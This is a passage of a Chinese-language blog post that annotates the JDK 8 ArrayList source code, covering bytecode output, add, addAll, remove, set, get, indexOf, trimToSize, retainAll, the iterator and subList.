<p>查看byte code<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">com</span>.<span class="title">xwolf</span>.<span class="title">ArrayListTest</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> com.xwolf.ArrayListTest();</span><br><span class="line">    Code:</span><br><span class="line">       <span class="number">0</span>: aload_0</span><br><span class="line">       1: invokespecial #1                  // Method java/lang/Object."&lt;init&gt;":()V</span><br><span class="line">       <span class="number">4</span>: <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>;</span><br><span class="line">    Code:</span><br><span class="line">       <span class="number">0</span>: iconst_3</span><br><span class="line">       <span class="number">1</span>: newarray       <span class="keyword">int</span></span><br><span class="line">       <span class="number">3</span>: dup</span><br><span class="line">       <span class="number">4</span>: iconst_0</span><br><span class="line">       <span class="number">5</span>: iconst_1</span><br><span class="line">       <span class="number">6</span>: iastore</span><br><span class="line">       <span class="number">7</span>: dup</span><br><span class="line">       <span class="number">8</span>: iconst_1</span><br><span class="line">       <span class="number">9</span>: iconst_2</span><br><span class="line">      <span class="number">10</span>: iastore</span><br><span class="line">      <span class="number">11</span>: dup</span><br><span class="line">      <span class="number">12</span>: iconst_2</span><br><span class="line">      <span class="number">13</span>: iconst_3</span><br><span class="line">      <span class="number">14</span>: iastore</span><br><span class="line">      <span class="number">15</span>: astore_1</span><br><span class="line">      16: getstatic     #2                  // Field java/lang/System.out:Ljava/io/PrintStream;</span><br><span class="line">      <span class="number">19</span>: aload_1</span><br><span class="line">      <span class="number">20</span>: arraylength</span><br><span class="line">      21: invokevirtual #3                  // Method java/io/PrintStream.println:(I)V</span><br><span class="line">      <span class="number">24</span>: <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test2</span><span class="params">()</span></span>;</span><br><span class="line">    Code:</span><br><span class="line">       <span class="number">0</span>: iconst_2</span><br><span class="line">       1: anewarray     #4                  // class java/lang/Integer</span><br><span class="line">       <span class="number">4</span>: dup</span><br><span class="line">       <span class="number">5</span>: iconst_0</span><br><span class="line">       <span class="number">6</span>: iconst_3</span><br><span class="line">       7: invokestatic  #5                  // Method java/lang/Integer.valueOf:(I)Ljava/lang/Integer;</span><br><span class="line">      <span class="number">10</span>: aastore</span><br><span class="line">      <span class="number">11</span>: dup</span><br><span class="line">      <span class="number">12</span>: iconst_1</span><br><span class="line">      <span class="number">13</span>: iconst_4</span><br><span class="line">      14: invokestatic  #5                  // Method java/lang/Integer.valueOf:(I)Ljava/lang/Integer;</span><br><span class="line">      <span class="number">17</span>: aastore</span><br><span class="line">      <span class="number">18</span>: astore_0</span><br><span class="line">      <span class="number">19</span>: aload_0</span><br><span class="line">      20: invokevirtual #6                  // Method "[Ljava/lang/Integer;".clone:()Ljava/lang/Object;</span><br><span class="line">      <span class="number">23</span>: pop</span><br><span class="line">      <span class="number">24</span>: <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(java.lang.String[])</span></span>;</span><br><span class="line">    Code:</span><br><span class="line">       0: invokestatic  #7                  // Method test2:()V</span><br><span class="line">       <span class="number">3</span>: <span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>此处不展开,arraylength、invokevirtual参考官网java虚拟机规范<a href="https://docs.oracle.com/javase/specs/jvms/se8/html/index.html" target="_blank" rel="noopener">https://docs.oracle.com/javase/specs/jvms/se8/html/index.html</a>.</p>
<blockquote>
<h2 id="add方法"><a href="#add方法" class="headerlink" title="add方法"></a>add方法</h2></blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//List后追加元素</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">add</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//扩容</span></span><br><span class="line">        ensureCapacityInternal(size + <span class="number">1</span>);  <span class="comment">// Increments modCount!!</span></span><br><span class="line">        elementData[size++] = e;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">ensureCapacityInternal</span><span class="params">(<span class="keyword">int</span> minCapacity)</span> </span>&#123;</span><br><span class="line">        ensureExplicitCapacity(<span class="function">ca <span class="title">lculateCapacity</span><span class="params">(elementData, minCapacity)</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//计算容量,元素为空返回默认容量和容量的最大值</span></span><br><span class="line"> <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">calculateCapacity</span><span class="params">(Object[] elementData, <span class="keyword">int</span> minCapacity)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (elementData == DEFAULTCAPACITY_EMPTY_ELEMENTDATA) &#123;</span><br><span class="line">            <span class="keyword">return</span> Math.max(DEFAULT_CAPACITY, minCapacity);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> minCapacity;</span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">//扩容到指定容量,修改次数modCount加1</span></span><br><span class="line"> <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">ensureExplicitCapacity</span><span class="params">(<span class="keyword">int</span> minCapacity)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//增加修改次数</span></span><br><span class="line">        modCount++;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (minCapacity - elementData.length &gt; <span class="number">0</span>)</span><br><span class="line">            grow(minCapacity);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">grow</span><span class="params">(<span class="keyword">int</span> minCapacity)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//old容量为元素数组的元素个数</span></span><br><span class="line">        <span class="keyword">int</span> oldCapacity = elementData.length;</span><br><span class="line">        <span class="comment">// 扩容至 old + (old/2)</span></span><br><span class="line">        <span class="keyword">int</span> newCapacity = oldCapacity + (oldCapacity &gt;&gt; <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (newCapacity - minCapacity &lt; <span class="number">0</span>)</span><br><span class="line">            newCapacity = minCapacity;</span><br><span class="line">        <span class="comment">//超过最大容量值,扩容至Integer的最大值    </span></span><br><span class="line">        <span class="keyword">if</span> (newCapacity - MAX_ARRAY_SIZE &gt; <span class="number">0</span>)</span><br><span class="line">            newCapacity = hugeCapacity(minCapacity);</span><br><span class="line">        <span class="comment">// minCapacity is usually close to size, so this is a win:</span></span><br><span class="line">        elementData = Arrays.copyOf(elementData, newCapacity);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//大容量,容量值小于0抛出异常,容量值大于最大数组长度返回Integer的最大值2^31-1</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">hugeCapacity</span><span class="params">(<span class="keyword">int</span> minCapacity)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (minCapacity &lt; <span class="number">0</span>) <span class="comment">// overflow</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> OutOfMemoryError();</span><br><span class="line">        <span class="keyword">return</span> (minCapacity &gt; MAX_ARRAY_SIZE) ?</span><br><span class="line">            Integer.MAX_VALUE :</span><br><span class="line">            MAX_ARRAY_SIZE;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<h2 id="add-int-index-E-element"><a href="#add-int-index-E-element" class="headerlink" title="add(int index, E element)"></a>add(int index, E element)</h2></blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//指定位置添加元素</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> index, E element)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//边界检查</span></span><br><span class="line">        rangeCheckForAdd(index);</span><br><span class="line">        <span class="comment">//扩容</span></span><br><span class="line">        ensureCapacityInternal(size + <span class="number">1</span>); </span><br><span class="line">        </span><br><span class="line">        <span class="comment">//将指定位置后的元素复制到扩容后的元素集合中</span></span><br><span class="line">        System.arraycopy(elementData, index, elementData, index + <span class="number">1</span>,</span><br><span class="line">                         size - index);</span><br><span class="line">        <span class="comment">//指定位置赋值                 </span></span><br><span class="line">        elementData[index] = element;</span><br><span class="line">        size++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//边界检查</span></span><br><span class="line"> <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">rangeCheckForAdd</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (index &gt; size || index &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IndexOutOfBoundsException(outOfBoundsMsg(index));</span><br><span class="line">    &#125;   </span><br><span class="line"></span><br><span class="line">    <span class="comment">/* @param      src      the source array.</span></span><br><span class="line"><span class="comment">     * @param      srcPos   starting position in the source array.</span></span><br><span class="line"><span class="comment">     * @param      dest     the destination array.</span></span><br><span class="line"><span class="comment">     * @param      destPos  starting position in the destination data.</span></span><br><span class="line"><span class="comment">     * @param      length   the number of array elements to be copied.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">//将src的srcPos的连续length个元素复制到dest的destPos的连续位置(替换)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">arraycopy</span><span class="params">(Object src,  <span class="keyword">int</span>  srcPos,</span></span></span><br><span class="line"><span class="function"><span class="params">                                        Object dest, <span class="keyword">int</span> destPos,</span></span></span><br><span class="line"><span class="function"><span class="params">                                        <span class="keyword">int</span> length)</span></span>;</span><br></pre></td></tr></table></figure>
<blockquote>
<h2 id="add-集合"><a href="#add-集合" class="headerlink" title="add 集合"></a>add 集合</h2></blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">addAll</span><span class="params">(Collection&lt;? extends E&gt; c)</span> </span>&#123;</span><br><span class="line">        Object[] a = c.toArray();</span><br><span class="line">        <span class="keyword">int</span> numNew = a.length;</span><br><span class="line">        ensureCapacityInternal(size + numNew);  <span class="comment">// Increments modCount</span></span><br><span class="line">        <span class="comment">//将集合元素追加到elementData后</span></span><br><span class="line">        System.arraycopy(a, <span class="number">0</span>, elementData, size, numNew);</span><br><span class="line">        size += numNew;</span><br><span class="line">        <span class="keyword">return</span> numNew != <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<h2 id="指定位置添加集合"><a href="#指定位置添加集合" class="headerlink" title="指定位置添加集合"></a>指定位置添加集合</h2></blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">addAll</span><span class="params">(<span class="keyword">int</span> index, Collection&lt;? extends E&gt; c)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//边界检查</span></span><br><span class="line">        rangeCheckForAdd(index);</span><br><span class="line"></span><br><span class="line">        Object[] a = c.toArray();</span><br><span class="line">        <span class="keyword">int</span> numNew = a.length;</span><br><span class="line">        <span class="comment">//扩容</span></span><br><span class="line">        ensureCapacityInternal(size + numNew);  <span class="comment">// Increments modCount</span></span><br><span class="line">        <span class="comment">//计算要移动的元素数量</span></span><br><span class="line">        <span class="keyword">int</span> numMoved = size - index;</span><br><span class="line">        <span class="keyword">if</span> (numMoved &gt; <span class="number">0</span>)</span><br><span class="line">            <span class="comment">//先将指定位置后的元素copy移动后指定位置的元素</span></span><br><span class="line">            System.arraycopy(elementData, index, elementData, index + numNew,</span><br><span class="line">                             numMoved);</span><br><span class="line">        <span class="comment">//将空出来的元素用添加的集合参数赋值</span></span><br><span class="line">        System.arraycopy(a, <span class="number">0</span>, elementData, index, numNew);</span><br><span class="line">        size += numNew;</span><br><span class="line">        <span class="keyword">return</span> numNew != <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>上图,更直观一点:</p>
<p><img src="https://i.imgur.com/VaSAqN2.png" alt></p>
<blockquote>
<h2 id="remove-指定索引位置的元素"><a href="#remove-指定索引位置的元素" class="headerlink" title="remove 指定索引位置的元素"></a>remove 指定索引位置的元素</h2></blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> E <span class="title">remove</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//边界检查</span></span><br><span class="line">        rangeCheck(index);</span><br><span class="line">        <span class="comment">//增加修改次数</span></span><br><span class="line">        modCount++;</span><br><span class="line">        <span class="comment">//获取指定索引位置的元素</span></span><br><span class="line">        E oldValue = elementData(index);</span><br><span class="line">        <span class="comment">//需要移动的元素的数量</span></span><br><span class="line">        <span class="keyword">int</span> numMoved = size - index - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (numMoved &gt; <span class="number">0</span>)</span><br><span class="line">            <span class="comment">//将index后的元素向前移动一位</span></span><br><span class="line">            System.arraycopy(elementData, index+<span class="number">1</span>, elementData, index,</span><br><span class="line">                             numMoved);</span><br><span class="line">        <span class="comment">//size减1,最后一个元素赋值null,等待GC处理                     </span></span><br><span class="line">        elementData[--size] = <span class="keyword">null</span>; <span class="comment">// clear to let GC do its work</span></span><br><span class="line">        <span class="comment">//返回删除的元素</span></span><br><span class="line">        <span class="keyword">return</span> oldValue;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<h2 id="remove指定的元素"><a href="#remove指定的元素" class="headerlink" title="remove指定的元素"></a>remove指定的元素</h2></blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//遍历删除指定的元素</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">remove</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (o == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> index = <span class="number">0</span>; index &lt; size; index++)</span><br><span class="line">                <span class="keyword">if</span> (elementData[index] == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    fastRemove(index);</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> index = <span class="number">0</span>; index &lt; size; index++)</span><br><span class="line">                <span class="keyword">if</span> (o.equals(elementData[index])) &#123;</span><br><span class="line">                    fastRemove(index);</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//快速移除</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">fastRemove</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">        modCount++;</span><br><span class="line">        <span class="keyword">int</span> numMoved = size - index - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (numMoved &gt; <span class="number">0</span>)</span><br><span class="line">            System.arraycopy(elementData, index+<span class="number">1</span>, elementData, index,</span><br><span class="line">                             numMoved);</span><br><span class="line">        elementData[--size] = <span class="keyword">null</span>; <span class="comment">// clear to let GC do its work</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<h2 id="set"><a href="#set" class="headerlink" title="set"></a>set</h2></blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> E <span class="title">set</span><span class="params">(<span class="keyword">int</span> index, E element)</span> </span>&#123;</span><br><span class="line">       <span class="comment">//边界检查</span></span><br><span class="line">        rangeCheck(index);</span><br><span class="line">        </span><br><span class="line">        E oldValue = elementData(index);</span><br><span class="line">        <span class="comment">//赋新值</span></span><br><span class="line">        elementData[index] = element;</span><br><span class="line">        <span class="keyword">return</span> oldValue;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<h2 id="get"><a href="#get" class="headerlink" title="get"></a>get</h2></blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> E <span class="title">get</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//边界检查</span></span><br><span class="line">        rangeCheck(index);</span><br><span class="line">        <span class="comment">//返回指定索引元素</span></span><br><span class="line">        <span class="keyword">return</span> elementData(index);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<h2 id="indexOf"><a href="#indexOf" class="headerlink" title="indexOf"></a>indexOf</h2></blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//遍历获取第一个元素的索引,找不到返回-1</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">indexOf</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (o == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">                <span class="keyword">if</span> (elementData[i]==<span class="keyword">null</span>)</span><br><span class="line">                    <span class="keyword">return</span> i;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">                <span class="keyword">if</span> (o.equals(elementData[i]))</span><br><span class="line">                    <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<h2 id="contains"><a href="#contains" class="headerlink" title="contains"></a>contains</h2></blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//索引大于0即为包含指定元素</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">contains</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> indexOf(o) &gt;= <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<h2 id="trimToSize"><a href="#trimToSize" class="headerlink" title="trimToSize"></a>trimToSize</h2></blockquote>
<p>将容量和实际数组元素个数保持一致,删除扩容的null元素.<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">trimToSize</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        modCount++;</span><br><span class="line">        <span class="keyword">if</span> (size &lt; elementData.length) &#123;</span><br><span class="line">            elementData = (size == <span class="number">0</span>)</span><br><span class="line">              ? EMPTY_ELEMENTDATA</span><br><span class="line">              : Arrays.copyOf(elementData, size);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<blockquote>
<h2 id="retainAll"><a href="#retainAll" class="headerlink" title="retainAll"></a>retainAll</h2></blockquote>
<p>获取两个集合的交集</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">retainAll</span><span class="params">(Collection&lt;?&gt; c)</span> </span>&#123;</span><br><span class="line">        Objects.requireNonNull(c);</span><br><span class="line">        <span class="keyword">return</span> batchRemove(c, <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">batchRemove</span><span class="params">(Collection&lt;?&gt; c, <span class="keyword">boolean</span> complement)</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">final</span> Object[] elementData = <span class="keyword">this</span>.elementData;</span><br><span class="line">        <span class="keyword">int</span> r = <span class="number">0</span>, w = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">boolean</span> modified = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (; r &lt; size; r++)</span><br><span class="line">                <span class="keyword">if</span> (c.contains(elementData[r]) == complement)</span><br><span class="line">                    <span class="comment">//如果包含元素直接赋值</span></span><br><span class="line">                    elementData[w++] = elementData[r];</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">// Preserve behavioral compatibility with AbstractCollection,</span></span><br><span class="line">            <span class="comment">// even if c.contains() throws.</span></span><br><span class="line">            <span class="comment">//如果循环异常中断,正常情况下r==size</span></span><br><span class="line">            <span class="keyword">if</span> (r != size) &#123;</span><br><span class="line">                System.arraycopy(elementData, r,</span><br><span class="line">                                 elementData, w,</span><br><span class="line">                                 size - r);</span><br><span class="line">                w += size - r;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//如果w!=size ,将w后的元素赋值为null</span></span><br><span class="line">            <span class="keyword">if</span> (w != size) &#123;</span><br><span class="line">                <span class="comment">// clear to let GC do its work</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = w; i &lt; size; i++)</span><br><span class="line">                    elementData[i] = <span class="keyword">null</span>;</span><br><span class="line">                modCount += size - w;</span><br><span class="line">                size = w;</span><br><span class="line">                modified = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> modified;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<h2 id="iterator"><a href="#iterator" class="headerlink" title="iterator"></a>iterator</h2></blockquote>
<p>迭代<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Iterator&lt;E&gt; <span class="title">iterator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Itr();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">Itr</span> <span class="keyword">implements</span> <span class="title">Iterator</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> cursor;       <span class="comment">// index of next element to return</span></span><br><span class="line">        <span class="keyword">int</span> lastRet = -<span class="number">1</span>; <span class="comment">// index of last element returned; -1 if no such</span></span><br><span class="line">        <span class="keyword">int</span> expectedModCount = modCount;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//是否还有下一个元素</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasNext</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> cursor != size;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//获取下一个元素</span></span><br><span class="line">        <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">        <span class="function"><span class="keyword">public</span> E <span class="title">next</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            checkForComodification();</span><br><span class="line">            <span class="keyword">int</span> i = cursor;</span><br><span class="line">            <span class="keyword">if</span> (i &gt;= size)</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> NoSuchElementException();</span><br><span class="line">            Object[] elementData = ArrayList.<span class="keyword">this</span>.elementData;</span><br><span class="line">            <span class="keyword">if</span> (i &gt;= elementData.length)</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ConcurrentModificationException();</span><br><span class="line">            cursor = i + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">return</span> (E) elementData[lastRet = i];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//删除元素</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">remove</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (lastRet &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException();</span><br><span class="line">            checkForComodification();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                ArrayList.<span class="keyword">this</span>.remove(lastRet);</span><br><span class="line">                cursor = lastRet;</span><br><span class="line">                lastRet = -<span class="number">1</span>;</span><br><span class="line">                expectedModCount = modCount;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IndexOutOfBoundsException ex) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ConcurrentModificationException();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">forEachRemaining</span><span class="params">(Consumer&lt;? <span class="keyword">super</span> E&gt; consumer)</span> </span>&#123;</span><br><span class="line">            Objects.requireNonNull(consumer);</span><br><span class="line">            <span class="keyword">final</span> <span class="keyword">int</span> size = ArrayList.<span class="keyword">this</span>.size;</span><br><span class="line">            <span class="keyword">int</span> i = cursor;</span><br><span class="line">            <span class="keyword">if</span> (i &gt;= size) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">final</span> Object[] elementData = ArrayList.<span class="keyword">this</span>.elementData;</span><br><span class="line">            <span class="keyword">if</span> (i &gt;= elementData.length) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ConcurrentModificationException();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (i != size &amp;&amp; modCount == expectedModCount) &#123;</span><br><span class="line">                consumer.accept((E) elementData[i++]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// update once at end of iteration to reduce heap write traffic</span></span><br><span class="line">            cursor = i;</span><br><span class="line">            lastRet = i - <span class="number">1</span>;</span><br><span class="line">            checkForComodification();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//检查修改</span></span><br><span class="line">        <span class="function"><span class="keyword">final</span> <span class="keyword">void</span> <span class="title">checkForComodification</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (modCount != expectedModCount)</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ConcurrentModificationException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<blockquote>
<h2 id="subList"><a href="#subList" class="headerlink" title="subList"></a>subList</h2></blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> List&lt;E&gt; <span class="title">subList</span><span class="params">(<span class="keyword">int</span> fromIndex, <span class="keyword">int</span> toIndex)</span> </span>&#123;</span><br><span class="line">        subListRangeCheck(fromIndex, toIndex, size);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> SubList(<span class="keyword">this</span>, <span class="number">0</span>, fromIndex, toIndex);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//边界检查</span></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">subListRangeCheck</span><span class="params">(<span class="keyword">int</span> fromIndex, <span class="keyword">int</span> toIndex, <span class="keyword">int</span> size)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (fromIndex &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IndexOutOfBoundsException(<span class="string">"fromIndex = "</span> + fromIndex);</span><br><span class="line">        <span class="keyword">if</span> (toIndex &gt; size)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IndexOutOfBoundsException(<span class="string">"toIndex = "</span> + toIndex);</span><br><span class="line">        <span class="keyword">if</span> (fromIndex &gt; toIndex)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"fromIndex("</span> + fromIndex +</span><br><span class="line">                                               <span class="string">") &gt; toIndex("</span> + toIndex + <span class="string">")"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      <span class="comment">//内部类</span></span><br><span class="line">       SubList(AbstractList&lt;E&gt; parent,</span><br><span class="line">                <span class="keyword">int</span> offset, <span class="keyword">int</span> fromIndex, <span class="keyword">int</span> toIndex) &#123;</span><br><span class="line">            <span class="keyword">this</span>.parent = parent;</span><br><span class="line">            <span class="keyword">this</span>.parentOffset = fromIndex;</span><br><span 